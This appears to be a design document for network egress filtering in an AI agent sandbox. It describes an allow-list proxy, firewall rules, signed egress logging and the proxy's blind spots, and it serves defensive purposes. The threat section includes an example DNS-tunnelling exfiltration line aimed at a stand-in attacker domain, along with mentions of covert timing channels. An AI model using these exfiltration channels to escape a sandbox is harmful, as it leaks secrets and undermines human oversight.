# Network Egress Capture & Filtering Design

This document details the architectural design for capturing and filtering network egress in agentbox sandboxes (Task 11 of Issue #10).

## 1. Problem Statement & Goals

Agents frequently require external network access to install packages (`pip`, `npm`), query documentation, or interact with external APIs. However, unconstrained network egress introduces serious risks:
- Exfiltration of environment variables, source code, or credentials.
- Ingestion of unvetted remote code.
- Lateral movement against internal networks or cloud metadata endpoints (`169.254.169.254`).

The goal is to provide:
1. **Explicit Allow-List Control**: Default-deny outbound egress with strict host/domain policies.
2. **Host-Side Auditability**: Every connection attempt (allowed or denied) is logged in the tamper-evident hash chain.
3. **Honest Threat Modeling**: Clear boundaries regarding what a proxy can and cannot observe.

## 2. Sandbox Network Architecture

In the current Docker backend, containers default to `--network none` (fully offline). Enabling egress requires a controlled routing topology:

~~~
┌─────────────────────────────────────────────────────────────────┐
│ Host                                                            │
│                                                                 │
│  ┌───────────────────────┐         ┌─────────────────────────┐  │
│  │ Container (Agentbox)  │         │ Egress Proxy (Host)     │  │
│  │                       │         │                         │  │
│  │ HTTP_PROXY=172.20.0.1 ├────────►│ - Allow-list validator  │  │
│  │ HTTPS_PROXY=...       │ (8080)  │ - Nonce & rule checker  │──┼──► Internet
│  │                       │         │ - Egress event emitter  │  │    (Allowed)
│  └──────────┬────────────┘         └────────────┬────────────┘  │
│             │                                   │               │
│             │ (Direct packets dropped)          ▼               │
│             ▼                         ┌──────────────────┐      │
│      [iptables / nftables]            │ Signed Hash Log  │      │
│      DROP all non-proxy egress        │ (network.egress) │      │
│                                       └──────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
~~~

### Network Isolation Rules
- **Isolated Bridge Network**: Sandboxes attach to an isolated Docker bridge network (e.g. `agentbox-net`).
- **Firewall Egress Trap**: Host firewall rules (`iptables` / `nftables`) block all direct outbound forwarding from the container subnet except to the proxy listen port on the host gateway IP (e.g. `172.20.0.1:8080`).
- **Environment Configuration**: Standard environment variables are injected into the sandbox:
  `HTTP_PROXY`, `HTTPS_PROXY`, `http_proxy`, `https_proxy`, `ALL_PROXY`.
- **Private Subnet Dropping**: Traffic aimed at loopback, host services, private RFC 1918 ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), and cloud link-local metadata addresses (`169.254.169.254`) is explicitly rejected.

## 3. Allow-List Policy Configuration

The policy specifies allowed destinations using exact domain names, glob wildcards, or CIDRs:

~~~json
{
  "policy": "default_deny",
  "allowed_hosts": [
    "pypi.org",
    "files.pythonhosted.org",
    "*.github.com",
    "api.github.com"
  ],
  "allowed_ports": [80, 443],
  "block_private_ranges": true
}
~~~

Any request targeting a host not in `allowed_hosts` receives an immediate `403 Forbidden` from the proxy, and the attempt is recorded.

## 4. Signed Log Integration (`network.egress`)

When the proxy processes a connection or request, it emits an event to the `Recorder` over an internal pipe/socket. The event is signed and added to the flight recorder hash chain:

~~~json
{
  "seq": 14,
  "ts": 1714392810.123,
  "event_type": "network.egress",
  "data": {
    "step_index": 3,
    "protocol": "HTTPS_CONNECT",
    "method": "CONNECT",
    "host": "pypi.org",
    "port": 443,
    "allowed": true,
    "status": 200,
    "bytes_sent": 1420,
    "bytes_received": 89432,
    "duration_ms": 312,
    "rule_matched": "pypi.org"
  }
}
~~~

For blocked requests, `allowed: false` and `status: 403` are logged along with the requested destination.

## 5. What the Proxy Cannot See (Honest Boundaries & Blind Spots)

A transparent or forward proxy provides strong auditing and perimeter control, but it is not an all-seeing boundary. In keeping with agentbox's security philosophy, these limitations are explicit:

### 1. Encrypted TLS Payloads (HTTP CONNECT Tunnels)
- For HTTPS traffic, standard clients issue an `HTTP CONNECT host:443` request to establish an opaque TCP tunnel.
- The proxy inspects and filters the **host and port**, and tracks total bytes sent/received.
- **The proxy cannot inspect request URLs, query parameters, headers, or body content inside the encrypted TLS stream.**
- *Why not MITM decryption?* Terminating TLS requires generating a custom Certificate Authority (CA) and injecting root certificates into the sandbox container trust store. This breaks client-side certificate pinning (common in SDKs and CLI tools), triggers warnings, and creates a significant secret-handling liability if the proxy logs decrypted payloads containing bearer tokens.

### 2. DNS Tunneling & Covert Channels
- If the sandbox is permitted to query arbitrary external DNS servers on port 53, an attacker can encode stolen data inside DNS queries (e.g. `lookup <secret>.attacker.com`).
- *Mitigation*: The sandbox network must either block outbound UDP/TCP port 53 completely (forcing HTTP proxy name resolution) or redirect all DNS queries to an internal resolver that only resolves allow-listed names.

### 3. Traffic Analysis & Covert Timing
- Even with opaque tunnels, an attacker with a cooperating external server can signal information via packet timing intervals, request counts, or payload sizes.

### 4. Non-HTTP Protocols
- Plain raw TCP/UDP outbound sockets (e.g. SSH, custom C2 protocols) must be dropped at the firewall level. They cannot be routed through a standard HTTP forward proxy.

## 6. Implementation Stages

1. **Proxy Daemon**: A lightweight, standard-library forward proxy server (`agentbox/egress_proxy.py`) running in a host background thread or process during runs.
2. **Docker Bridge Integration**: Provisioning an isolated Docker bridge network when egress is enabled (`--egress allowlist.json`).
3. **Log Schema Update**: Registering `network.egress` in `docs/schema.json` and reporting egress summaries in `agentbox report`.
